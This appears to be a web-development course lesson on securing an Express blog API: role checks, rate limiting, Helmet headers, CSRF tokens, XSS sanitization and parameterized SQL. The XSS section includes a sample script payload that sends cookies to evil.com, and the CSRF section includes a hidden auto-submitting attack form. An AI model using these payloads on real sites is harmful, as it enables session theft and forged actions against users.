---
title: "Security Best Practices"
estimatedMinutes: 35
---

# Security Best Practices

You have authentication working: users can register, log in, and receive a token. Now the question is: what happens after authentication? How do you ensure users can only do what they are supposed to do, and how do you protect your application against the most common web attacks?

This lesson covers role-based access control, rate limiting, security headers, and the input sanitization practices that separate a secure app from a vulnerable one.

---

## Role-Based Access Control (RBAC)

Authorization is not just "logged in vs not logged in." Most applications have multiple levels of access. Role-based access control organizes permissions into named roles and assigns users to those roles.

For the blog app, a minimal RBAC model looks like this:

```
reader  → can view posts and comments
author  → can create posts, edit/delete their own posts
admin   → can edit/delete any post, manage users
```

Add a `role` column to the users table:

```sql
ALTER TABLE users
ADD COLUMN role VARCHAR(20) NOT NULL DEFAULT 'author'
CHECK (role IN ('reader', 'author', 'admin'));
```

Include the role in the JWT payload so middleware can check it without a database query:

```javascript
// When signing the token at login
const token = jwt.sign(
  { userId: user.id, email: user.email, role: user.role },
  JWT_SECRET,
  { expiresIn: '24h' }
);
```

Now write authorization middleware for role checking:

```javascript
// server/middleware/requireRole.js

// requireAuth must run before requireRole -- it sets req.user
export function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user) {
      // requireAuth was not applied before this middleware
      return res.status(401).json({ error: 'Authentication required' });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
}
```

Apply it to routes:

```javascript
import { requireAuth } from '../middleware/requireAuth.js';
import { requireRole } from '../middleware/requireRole.js';

// Only admins can delete any post
router.delete('/:id', requireAuth, requireRole('admin'), async (req, res) => {
  await pool.query('DELETE FROM posts WHERE id = $1', [req.params.id]);
  res.json({ message: 'Post deleted' });
});
```

### Resource Ownership: Author-Level Authorization

Role checks handle broad permissions. But "only the author can edit their own post" is an ownership check, not a role check. Implement it in the route handler after loading the resource:

```javascript
router.put('/:id', requireAuth, async (req, res) => {
  const { id } = req.params;
  const { title, content } = req.body;

  // 1. Load the post
  const result = await pool.query('SELECT * FROM posts WHERE id = $1', [id]);
  const post = result.rows[0];

  if (!post) {
    return res.status(404).json({ error: 'Post not found' });
  }

  // 2. Check ownership (or admin override)
  if (post.user_id !== req.userId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'You can only edit your own posts' });
  }

  // 3. Perform the update
  const updated = await pool.query(
    'UPDATE posts SET title = $1, content = $2, updated_at = NOW() WHERE id = $3 RETURNING *',
    [title, content, id]
  );

  res.json(updated.rows[0]);
});
```

This pattern (load resource, check ownership, then act) works for any resource type: posts, comments, profile settings.

---

## Rate Limiting

Without rate limiting, your login endpoint is wide open to brute-force attacks. An attacker can try thousands of password combinations per minute.

Install express-rate-limit:

```bash
npm install express-rate-limit
```

Apply a strict limit to auth endpoints and a looser limit to general API routes:

```javascript
// server/middleware/rateLimits.js
import rateLimit from 'express-rate-limit';

// Tight limit for login/register -- 10 attempts per 15 minutes per IP
export const authRateLimit = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  max: 10,                     // 10 requests per window per IP
  message: {
    error: 'Too many attempts. Please wait 15 minutes and try again.',
  },
  standardHeaders: true,       // Include RateLimit-* headers in response
  legacyHeaders: false,
});

// General API limit -- 100 requests per minute per IP
export const apiRateLimit = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  message: { error: 'Too many requests. Please slow down.' },
  standardHeaders: true,
  legacyHeaders: false,
});
```

Apply the limits:

```javascript
// server/index.js
import { authRateLimit, apiRateLimit } from './middleware/rateLimits.js';

// Apply to all API routes
app.use('/api', apiRateLimit);

// Override with tighter limit for auth routes
app.use('/api/auth', authRateLimit);
```

For production, configure rate limiting with a Redis store (so it works across multiple server instances), using the `rate-limit-redis` package.

---

## Security Headers with Helmet

HTTP response headers can instruct browsers to behave more securely. Setting them manually is tedious. Helmet sets them all with sensible defaults:

```bash
npm install helmet
```

```javascript
// server/index.js
import helmet from 'helmet';

// Apply as early as possible, before other middleware
app.use(helmet());
```

Here is what Helmet configures by default:

```
Content-Security-Policy    -- Controls which resources the browser can load
X-DNS-Prefetch-Control     -- Disables DNS prefetching
X-Frame-Options            -- Prevents clickjacking by blocking iframes
X-Powered-By               -- Removed (hides Express from attackers)
Strict-Transport-Security  -- Forces HTTPS in browsers that support it
X-Content-Type-Options     -- Prevents MIME type sniffing
Referrer-Policy            -- Controls referrer header behavior
```

The Content Security Policy (CSP) header is the most impactful for XSS prevention. It tells the browser which script sources are trusted:

```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],                    // Only load resources from same origin
      scriptSrc: ["'self'"],                     // No inline scripts, no external scripts
      styleSrc: ["'self'", "'unsafe-inline'"],   // Allow inline styles (common in SPAs)
      imgSrc: ["'self'", "data:", "https:"],     // Allow HTTPS images
      connectSrc: ["'self'"],                    // Only AJAX to same origin
    },
  },
}));
```

If your React app is on a different origin than your API, adjust `connectSrc` accordingly.

---

## CSRF Protection

Cross-Site Request Forgery (CSRF) tricks a user's browser into making requests to your API using the user's existing authentication.

**The attack scenario:**

1. User logs into your blog and has a valid session cookie
2. User visits a malicious site with this hidden form:
   ```html
   <form action="https://yourblog.com/api/posts/42" method="POST">
     <input name="content" value="Hacked!" />
   </form>
   <script>document.forms[0].submit()</script>
   ```
3. The browser automatically includes the blog's cookies
4. Your server cannot tell this was not the user's own action

**CSRF protection for cookie-based auth:**

The `sameSite: 'lax'` cookie attribute is your primary defense for same-origin apps. It prevents the cookie from being sent with cross-site POST requests initiated by forms or scripts on other domains.

For APIs consumed by multiple origins, or where `sameSite: 'none'` is required, add explicit CSRF tokens:

```bash
npm install csrf-csrf
```

```javascript
import { doubleCsrf } from 'csrf-csrf';

const { generateToken, doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: '__Host-psifi.x-csrf-token',
  cookieOptions: { sameSite: 'lax', secure: true },
});

// Endpoint to get a CSRF token (client calls this before any state-changing request)
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: generateToken(req, res) });
});

// Apply CSRF protection to all state-changing routes
app.use(doubleCsrfProtection);
```

JWTs sent in the `Authorization` header (not cookies) are inherently CSRF-safe because browsers do not automatically add arbitrary headers to cross-origin requests.

---

## XSS Prevention

Cross-Site Scripting (XSS) is when an attacker injects malicious scripts into your app's output that execute in other users' browsers.

**The attack scenario:**

A user submits a post with this title: `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`

If you render that title directly as HTML, every user who views it runs the attacker's script.

**Prevention layers:**

1. **Escape output in templates.** If you are using a template engine, ensure auto-escaping is on (it usually is by default). In React, JSX escapes values by default -- `{title}` is safe, `dangerouslySetInnerHTML` is not.

2. **Sanitize HTML input.** If you allow rich text (formatted blog content), use a sanitization library instead of trusting raw HTML:

```bash
npm install dompurify jsdom
```

```javascript
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const { window } = new JSDOM('');
const purify = DOMPurify(window);

function sanitizeHtml(dirty) {
  return purify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'h2', 'h3', 'a'],
    ALLOWED_ATTR: ['href'],
  });
}

// In your post creation route:
const safeContent = sanitizeHtml(req.body.content);
```

3. **Content Security Policy.** As covered in the Helmet section, CSP blocks inline scripts even if they get into your HTML.

4. **httpOnly cookies.** If your auth tokens are in httpOnly cookies, XSS cannot steal them via `document.cookie`.

---

## Input Validation and SQL Injection Prevention

SQL injection occurs when user input is interpolated directly into SQL queries. You are already preventing this by using parameterized queries:

```javascript
// UNSAFE -- never do this
const result = await pool.query(
  `SELECT * FROM users WHERE email = '${email}'`  // email could be anything
);

// SAFE -- parameterized query
const result = await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [email]   // pg driver handles escaping
);
```

Always use parameterized queries (the `$1`, `$2` syntax in pg). Never concatenate user input into a query string.

For input validation beyond basic checks, use a schema validation library:

```bash
npm install zod
```

```javascript
import { z } from 'zod';

const registerSchema = z.object({
  email: z.string().email('Invalid email format'),
  password: z.string().min(8, 'Password must be at least 8 characters'),
  displayName: z.string().max(100).optional(),
});

router.post('/register', async (req, res) => {
  const parsed = registerSchema.safeParse(req.body);

  if (!parsed.success) {
    return res.status(400).json({
      error: 'Validation failed',
      details: parsed.error.flatten().fieldErrors,
    });
  }

  const { email, password, displayName } = parsed.data;
  // Continue with validated, typed data...
});
```

---

## HTTPS in Production

All of the cookie security flags (`secure: true`, `sameSite`) only work as intended over HTTPS. Running HTTP in production undermines every other security measure.

On Vercel, Railway, Render, or Fly.io, HTTPS is automatic -- no configuration needed. If you are managing your own server:

1. Use Nginx or Caddy as a reverse proxy and let them handle TLS termination
2. Get a free certificate from Let's Encrypt (Certbot automates this)
3. Set `HSTS` (Strict-Transport-Security) to tell browsers to always use HTTPS

In your Express app, trust the proxy so that `req.secure` works correctly behind Nginx:

```javascript
app.set('trust proxy', 1);
// Now req.secure reflects HTTPS even behind a proxy
```

---

## Security Checklist

Before shipping any feature that touches user data or authentication:

- [ ] Passwords are hashed with bcrypt (minimum 12 salt rounds)
- [ ] No plaintext passwords are logged or returned in API responses
- [ ] All SQL queries use parameterized inputs (`$1`, `$2`)
- [ ] All user-supplied HTML content is sanitized before storage or rendering
- [ ] Auth endpoints have rate limiting applied
- [ ] Helmet is applied before other middleware
- [ ] Session/JWT cookies are `httpOnly: true` and `secure: true` in production
- [ ] `sameSite: 'lax'` is set on auth cookies
- [ ] `req.session.regenerate()` is called on login (session apps)
- [ ] Ownership checks are performed before mutating any user-owned resource
- [ ] Roles are validated server-side, never trusted from client input
- [ ] Error messages do not reveal internal system details to the client

---

## Key Takeaways

- RBAC assigns permissions to roles; ownership checks verify resource-level access. Both are needed
- Rate limiting on auth endpoints prevents brute-force attacks with minimal implementation effort
- Helmet sets a full suite of security headers in one middleware call; apply it before everything else
- `sameSite: 'lax'` on cookies is the primary CSRF defense for same-origin apps
- XSS prevention requires output escaping, HTML sanitization for rich content, and CSP headers working together
- Parameterized queries (`$1`, `$2` syntax) are the only safe way to include user data in SQL
- HTTPS is not optional in production: without it, all cookie security flags are undermined

---

## Try It Yourself

**Exercise 1.** Add the `role` column to your users table with a migration file. Write a `requireRole` middleware that checks `req.user.role` against an allowed list. Apply it to a new admin-only route (`DELETE /api/admin/posts/:id`) and test that a regular user gets 403 while an admin user succeeds.

**Exercise 2.** Add Helmet and express-rate-limit to your blog API. Check the response headers in DevTools (Network tab, select any API response, look at the Response Headers). List five headers that Helmet added and explain in your own words what each one does.

**Exercise 3.** Write a test script that attempts to log in with a wrong password 15 times in a row using a loop and `fetch`. Confirm that after 10 attempts you receive a 429 response with your rate limit error message. This verifies your rate limiting is actually working, not just configured.
